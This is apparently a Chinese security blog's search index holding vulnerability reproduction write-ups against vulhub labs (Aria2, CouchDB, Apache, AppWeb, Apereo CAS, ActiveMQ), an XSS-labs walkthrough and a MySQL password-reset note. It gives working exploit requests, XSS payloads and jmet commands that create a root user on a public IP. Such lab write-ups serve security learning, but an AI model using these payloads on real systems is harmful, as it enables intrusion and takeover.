{"pages":[{"title":"About","date":"2020-09-12T00:36:55.891Z","path":"about/index.html","text":""},{"title":"Categories","date":"2020-09-12T00:36:55.893Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2020-09-12T00:36:55.895Z","path":"tags/index.html","text":""}],"posts":[{"title":"","date":"2020-10-26T08:55:02.569Z","path":"wiki/渗透/Web渗透/漏洞复现/Aria2 任意文件写入漏洞复现/","text":"Aria2 任意文件写入漏洞Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。 参考文章：https://paper.seebug.org/120/ 环境搭建启动漏洞环境： 1docker-compose up -d 6800是aria2的rpc服务的默认端口，环境启动后，访问http://your-ip:6800/，发现服务已启动并且返回404页面。 漏洞复现因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 http://binux.github.io/yaaw/demo/ 。 打开yaaw，点击配置按钮，填入运行aria2的目标域名：http://your-ip:6800/jsonrpc: 然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell： 这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell： 如果反弹不成功，注意crontab文件的格式，以及换行符必须是\\n，且文件结尾需要有一个换行符。 当然，我们也可以尝试写入其他文件，更多利用方法可以参考这篇文章","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Couchdb 垂直权限绕过漏洞（CVE-2017-12635）复现","date":"2020-10-22T03:17:50.712Z","path":"wiki/渗透/Web渗透/漏洞复现/Couchdb 垂直权限绕过漏洞（CVE-2017-12635）复现/","text":"[toc] 漏洞概览Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。 漏洞影响这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 影响版本小于 1.7.0 以及 小于 2.1.1 测试环境编译及启动环境： 12docker-compose builddocker-compose up -d 环境启动后，访问http://your-ip:5984/_utils/即可看到一个web页面，说明Couchdb已成功启动。但我们不知道密码，无法登陆。漏洞复现首先，发送如下数据包： 123456789101112131415PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1Host: your-ip:5984Accept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: application&#x2F;jsonContent-Length: 90&#123; &quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;vulhub&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;password&quot;: &quot;vulhub&quot;&#125; 可见，返回403错误：{“error”:”forbidden”,”reason”:”Only _admin may set roles”}，只有管理员才能设置Role角色： 发送包含两个roles的数据包，即可绕过限制： 12345678910111213141516PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1Host: your-ip:5984Accept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: application&#x2F;jsonContent-Length: 108&#123; &quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;vulhub&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [], &quot;password&quot;: &quot;vulhub&quot;&#125; 成功创建管理员，账户密码均为vulhub，再次访问http://your-ip:5984/_utils/，输入账户密码vulhub，可以成功登录：","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Apache SSI 远程命令执行漏洞复现","date":"2020-10-21T14:48:58.617Z","path":"wiki/渗透/Web渗透/漏洞复现/Apache SSI 远程命令执行漏洞复现/","text":"[toc] 漏洞概览在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用语法执行任意命令。 形成条件目标服务器开启了SSI与CGI支持 漏洞环境运行一个支持SSI与CGI的Apache服务器： 1docker-compose up -d 环境启动后，访问http://your-ip:8080/upload.php，即可看到一个上传表单。 漏洞复现正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件： 1&lt;!--#exec cmd&#x3D;&quot;ls -l&quot; --&gt; 成功上传，然后访问shell.shtml，可见命令已成功执行：","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Apache HTTPD 多后缀解析漏洞复现","date":"2020-10-20T07:06:53.512Z","path":"wiki/渗透/Web渗透/漏洞复现/Apache HTTPD 多后缀解析漏洞复现/","text":"[toc] 漏洞概述Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件： 12AddType text&#x2F;html .htmlAddLanguage zh-CN .cn 其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。 以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器： 1AddHandler application&#x2F;x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 漏洞环境运行如下命令启动一个稳定版Apache，并附带PHP 7.3环境： 1docker-compose up -d 漏洞复现环境运行后，访问目标ip地址，是一个文件上传的页面：尝试上传一个图片文件，有显示上传路径，并且文件名未做处理，可直接访问： 我们尝试可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell：访问：说明上传文件内phpinfo()代码执行成功，故可能明此处可getshell。 漏洞防御1、使用SetHandler,写好正则 123&lt;FileMatch “.+.php$”&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FileMatch&gt; 2、禁止.php这样的文件执行 123&lt;FileMatch “.+.ph(p[3457]?|t|tml).”&gt;Require all denied&lt;&#x2F;FileMatch&gt;","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Apache HTTPD 换行解析漏洞（CVE-2017-15715）复现","date":"2020-10-20T03:44:00.142Z","path":"wiki/渗透/Web渗透/漏洞复现/Apache HTTPD 换行解析漏洞（CVE-2017-15715）复现/","text":"[toc] 漏洞概述Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 影响版本Apache 2.4.0~2.4.29 漏洞环境编译及运行漏洞环境： 12docker-compose builddocker-compose up -d 启动后Apache运行在http://your-ip:8080。 漏洞复现上传一个名为1.php的文件，被拦截：通过十六进制编辑在1.php后面插入一个\\x0A（注意，不能是\\x0D\\x0A，只能是一个\\x0A），不再拦截：访问刚才上传的/evil.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"AppWeb认证绕过漏洞（CVE-2018-8715）复现","date":"2020-10-18T11:04:22.553Z","path":"wiki/渗透/Web渗透/漏洞复现/AppWeb认证绕过漏洞（CVE-2018-8715）复现/","text":"[toc]AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。 AppWeb可以进行认证配置，其认证方式包括以下三种： basic 传统HTTP基础认证 digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头 form 表单认证其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。 漏洞环境执行如下命令启动一个带有digest认证的Appweb 7.0.1服务器： 1docker-compose up -d 访问http://your-ip:8080，可见需要输入账号密码。 漏洞复现利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为admin。使用admin空密码登录 构造头Authorization: Digest username=&quot;admin&quot;，并发送如下数据包： 12345678GET &#x2F; HTTP&#x2F;1.1Host: example.comAccept-Encoding: gzip, deflateAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeAuthorization: Digest username&#x3D;&quot;admin&quot; 可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，此页面为登录成功页面，且包含一个session：认证登录成功：","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Apereo CAS 4.1 反序列化命令执行漏洞复现","date":"2020-10-17T09:25:28.829Z","path":"wiki/渗透/Web渗透/漏洞复现/Apereo CAS 4.1 反序列化命令执行漏洞复现/","text":"[TOC]Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。 一、环境搭建执行如下命令启动一个Apereo CAS 4.1.5： 1docker-compose up -d 环境启动后，访问http://your-ip:8080/cas/login即可查看到登录页面。 二、漏洞复现漏洞原理实际上是Webflow中使用了默认密钥changeit： 123456789101112131415public class EncryptedTranscoder implements Transcoder &#123; private CipherBean cipherBean; private boolean compression = true; public EncryptedTranscoder() throws IOException &#123; BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean(); bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(\"AES\", \"CBC\", \"PKCS7\")); bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore()); bufferedBlockCipherBean.setKeyAlias(\"aes128\"); bufferedBlockCipherBean.setKeyPassword(\"changeit\"); bufferedBlockCipherBean.setNonce(new RBGNonce()); this.setCipherBean(bufferedBlockCipherBean); &#125; // ... 我们使用Apereo-CAS-Attack来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload： 1java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot; 然后我们登录CAS并抓包，将Body中的execution值替换成上面生成的Payload发送： 12345678910111213141516POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1Host: your-ipContent-Length: 2287Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;your-ip:8080Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;your-ip:8080&#x2F;cas&#x2F;loginAccept-Encoding: gzip, deflateAccept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8Cookie: JSESSIONID&#x3D;24FB4BAAE1A66E8B76D521EE366B3E12; _ga&#x3D;GA1.1.1139210877.1586367734Connection: closeusername&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution&#x3D;[payload]&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN 登录Apereo CAS，可见touch /tmp/success已成功执行，即漏洞复现成功： 三、防御措施升级到安全版本版本。","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"","date":"2020-10-17T02:57:56.532Z","path":"wiki/渗透/Web渗透/漏洞复现/ActionMQ任意文件写入漏洞（cve-2016-3088）复现/","text":"ActiveMQ任意文件写入漏洞（CVE-2016-3088）[TOC] 一、环境搭建搭建及运行漏洞环境： 12docker-compose builddocker-compose up -d 环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞就出现在web控制台中。 访问http://your-ip:8161/看到web页面，说明环境已成功运行。 二、背景简述ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。 fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现： 其使用率并不高 文件操作容易出现漏洞 所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。 在测试过程中，可以关注ActiveMQ的版本，避免走弯路。 三、影响版本Apache ActiveMQ 5.0.0 - 5.13.2 四、漏洞详情本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。 文件写入有几种利用方法： 写入webshell 写入cron或ssh key等文件 写入jar或jetty.xml等库和配置文件 写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。 五、漏洞防御1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。 六、漏洞利用案例写入webshell前面说了，写入webshell，需要写在admin或api应用中，而这俩应用都需要登录才能访问。 默认的ActiveMQ账号密码均为admin，首先访问http://your-ip:8161/admin/test/systemProperties.jsp，查看ActiveMQ的绝对路径： 然后上传webshell： 123456789PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1Host: localhost:8161Accept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Length: 120976webshell... 访问文件内容如如下： 移动到web目录下的api文件夹（/opt/activemq/webapps/api/s.jsp）中： 12345678MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jspHost: localhost:8161Accept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Length: 0 成功访问webshell，表明webshell写入成功：","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"ActiveMQ 反序列化漏洞（CVE-2015-5254）复现","date":"2020-10-16T15:15:51.131Z","path":"wiki/渗透/Web渗透/漏洞复现/ActiveMQ 反序列化漏洞（cve-2015-5254）复现/","text":"[TOC] 一、漏洞描述该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的java消息服务(JMS)ObjectMessage对象利用该漏洞执行任意代码。 二、漏洞影响版本Apache ActiveMQ 5.13.0之前的版本 三、漏洞环境搭建使用docker搭建vulhub漏洞库。 启动环境： 访问8161端口，如下图所示为管理员登录界面，环境搭建成功： 四、复现过程1、登录访问目标8161端口，进行登录（admin，admin） 2、使用 jmet 进行漏洞利用下载 jmet 的 jar 文件，并在同目录下创建一个 external 文件夹。 123cd &#x2F;optwget https:&#x2F;&#x2F;github.com&#x2F;matthiaskaiser&#x2F;jmet&#x2F;releases&#x2F;download&#x2F;0.1.0&#x2F;jmet-0.1.0-all.jarmkdir external 3、执行命令12345kali@kali:&#x2F;opt$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;sucess&quot; -Yp ROME &lt;IP&gt; 61616Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings&#x3D;on -Dswing.aatext&#x3D;trueINFO d.c.j.t.JMSTarget [main] Connected with ID: ID:kali-33935-1602856866016-0:1INFO d.c.j.t.JMSTarget [main] Sent gadget &quot;ROME&quot; with command: &quot;touch &#x2F;tmp&#x2F;sucess&quot;INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:kali-33935-1602856866016-0:1 查看管理ActiveMQ管理界面（/admin/browse.jsp?JMSDestination=event），发现添加了一个队列： 4、触发点击队列查看消息即可触发命令执行： 5、结果验证进入容器：/tmp/sucess目录被创建成功： 五、利用之添加用户操作执行 jmet 的命令添加 test 用户并将其添加到 root：1、执行添加用户命令： 1java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;useradd -g root -s &#x2F;bin&#x2F;bash -u 10010 test&quot; -Yp ROME 139.180.217.179 61616 2、将 passwd 中的 test 的 uid 修改为 0，使它拥有 root ，执行命令： 1java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;sed -i &quot;s&#x2F;test:x10010&#x2F;test:x0&#x2F;g&quot; &#x2F;etc&#x2F;passwd&quot; -Yp ROME 139.180.217.179 61616 3、为 test 用户设置一个密码 1java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;echo &quot;test:sd123456&quot; | chpasswd&quot; -Yp ROME 139.180.217.179 61616 到此为止，一个权限为 root，密码为 123456 的用户即创建完毕。 cat /etc/passwd 查看用户权限","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"漏洞复现","slug":"渗透/Web渗透/漏洞复现","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"XSS-labs通关记","date":"2020-10-08T09:01:23.498Z","path":"wiki/渗透/Web渗透/学习笔记/xsslabs通关记/","text":"[TOC] level1当前页面输入点为url中name参数，页面中会将参数值的内容和字符长度暂时出来。接下来就先在name参数值上做动作：源码内容如图，我们可以尝试在“欢迎用户test”处插入&lt;script&gt;alert(1)&lt;/script&gt;进行测试：测试通过: level2level2中可尝试利用输入点为keyword参数，有两处输出显示位置：使用&lt;script&gt;alert(1)&lt;/script&gt;进行测试，发现&lt;h2&gt;标签内的&lt;&gt;被实体化编码了，但是&lt;input&gt;标签内的并没有被实体化编码：故接下来对input标签下手，构造闭合payload： 1&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&quot; 形成完美的payload闭合： level3level3中可尝试利用的输入点同样为keyword参数，有两处输出显示位置。使用和level相同的方法（level2闭合使用的双引号、在level3中为单引号）进行测试，发现&lt;input&gt;标签内的输出也对&lt;&gt;进行了编码：所以这里就不适合使用带有&lt;&gt;的payload，构造如下payload： 1&#39; onmouseover&#x3D;javascript:alert(1) &#39; 与原语句形成闭合： 由于输入输入框输入之后，保留了输入的内容，onmouseover属性也会被保留在input标签中，onmouseover的触发条件是当鼠标移动到input标签上，测试如下： level4level4和level3雷同，只是input标签内用于闭合的的引号为&quot;而非level3中的&#39;，只需要将level3中payload里面的&#39;换成&quot;即可：&quot; onmouseover=javascript:alert(1) &quot; level5看似和level4雷同：使用payload&quot; onmouseover=javascript:alert(1) &quot;进行测试，发现&lt;input&gt;标签内onmouseover属性被下划线（_）分割： 经测试：&lt;script&gt;，onclick等均会被分隔，使用大小写混合也没有办法绕过：故这里需避免使用&lt;script&gt;标签和事件属性的方法，尝试使用&lt;a&gt;标签进行测试，构造如下payload： 1&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;link&lt;&#x2F;a&gt; &lt;&quot; 通过构造独立出来一个&lt;a&gt;标签，通过点击可实现测试成功： level6源码如下：level6看似相同于level，首先使用level5的payload对level6进行测试，但是href被分隔开了：变换href大小写：&quot;&gt;&lt;a hRef=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;&lt;&quot;，绕过成功： level7使用level6的payload测试，发现href和script字样被替换为空了：尝试双写绕过： 1&quot;&gt;&lt;a hRhrefef&#x3D;&quot;javascriscriptpt:alert(&#39;test&#39;)&quot;&gt;link&lt;&#x2F;a&gt;&lt;&quot; 测试成功： level8查看源码，有input标签和a标签两个位置可以显示输入的语句：首先对第一处尝试测试，使用level5的payload尝试： 1&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(&#x2F;xss&#x2F;)&quot;&gt;link&lt;&#x2F;a&gt; &lt;&quot; payload内的符号均被实体化编码了，并且script字样被下划线分隔开来，接下来对第二处构造payload： 1javascript:alert(1) 并且对payload进行unicode编码，构成： 1&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt; 测试成功： level9输入“11111111”内容，源码内显示链接不合法：经多次测试发现，带有http://字样的payload才被识别为正常输入：推测后端对输入做了检查，只有带http://才合法，因此我们的payload内需要包含http://字样，构造如下payload： 1javascript:alert(&#39;http:&#x2F;&#x2F;&#39;) 但是script关键字还是被分割：使用Unicode编码对script编码或其中一个字母编码（这里对c进行编码）后测试： 1javas&amp;#99;ript:alert(&#39;http:&#x2F;&#x2F;&#39;) 测试成功： level10观察可知keyword参数值会被实体化编码，咋一看除keyword参数外没有其他可利用的输入位置，但是查看源码发现有三个隐藏的输入框：分别使用get方式向提交三个输入框的参数：发现只有t_sort参数有反应，那么就在这个参数上做工作，构造payload： 1&quot; onmouseover&#x3D;javascript:alert(1) &quot; type&#x3D;&quot;text 测试成功： level11查看源码，发现有一个t_ref参数值为跳转的前一跳URL，推测参数值来源于请求包中Referer值，故通过操作Referer值来测试：更改原Referer值为payload： 1&quot; onmouseover&#x3D;javascript:alert(1) &quot; type&#x3D;&quot;text 测试成功通过： level12level12雷同于level11，因为经过分析发现，请求包中User-Agent值可操作：构造同level11的payload： 1&quot; onmouseover&#x3D;javascript:alert(1) &quot; type&#x3D;&quot;text level13 level14这一关貌似环境出问题了，调用的链接失效了：放后面再进行研究。 level15) 这里引用了angular.min.js javascript框架。然后在网上找到了这个框架的包含模块资料，也就是ng-include，类似于文件包含这么一个功能，并且有以下一些特点：ng-include可以包含一个html文件（但不限于html文件）， 但只是加载一个静态页面显示在前端，不会加载里面的js。使用时要在文件名要用单引号包起来。ng-include不仅能引进其他文件显示在当前界面，对其的参数提交操作也能显示。ng-include限制了不能加载自带的js,需要载入后二次触发才可以触发。构造如下payload： 1&#39;level1.php?name&#x3D;&lt;a href&#x3D;javascript:alert(1)&gt;click&lt;&#x2F;a&gt;&#39; 测试成功： level16提交test&lt;script&gt;alert(1)&lt;/script&gt;值作为payload给keyword，发现后台替换了script为空格，并且给实体化编码了，但是尖括号依旧可以使用：更换img标签并且使用换行(%0a)来替换空格，构造新的payload： 1&lt;img%0asrc&#x3D;x%0aonerror&#x3D;alert(1)&gt; 测试成功： level17可以看到 &lt;embed&gt; 标签， 标签定义嵌入的内容，比如插件。这里嵌入了 swf 格式也就是 flash 专用格式。这里直接插入事件payload即可： 1%0aonmouseover%3dalert(1) 测试成功： level18看源码与level17雷同：level17payload可用： 1onmouseover&#x3D;alert(1) level19/level20两道flash XSS，暂且在能力范围外，改天回头研究。","tags":[],"categories":[{"name":"渗透","slug":"渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"},{"name":"Web渗透","slug":"渗透/Web渗透","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"},{"name":"学习笔记","slug":"渗透/Web渗透/学习笔记","permalink":"https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"重置mysql密码的一种方法","date":"2020-09-22T13:12:31.469Z","path":"wiki/数据库/重置mysql密码的一种方法/","text":"如果遇到mysql忘记密码的时候，可以尝试以下这种方式：以下是需要修改root密码的过程步骤：1、修改 /etc/my.cnf，在 [mysqld] 小节下添加一行： 1skip-grant-tables&#x3D;1 这一行配置让 mysqld 启动时不对密码进行验证2、重启 mysqld 服务：systemctl restart mysqld3、使用 root 用户登录到 mysql：mysql -u root 4、切换到mysql数据库，更新 user 表： 1update user set authentication_string &#x3D; password(&#39;root&#39;), password_expired &#x3D; &#39;N&#39;, password_last_changed &#x3D; now() where user &#x3D; &#39;root&#39;; 在之前的版本中，密码字段的字段名是 password，5.7版本改为了 authentication_string。5、刷新权限使得修改密码生效 1mysql&gt; flush privileges; 6、退出 mysql，编辑 /etc/my.cnf 文件，删除 skip-grant-tables=1 的内容。6、重启 mysqld 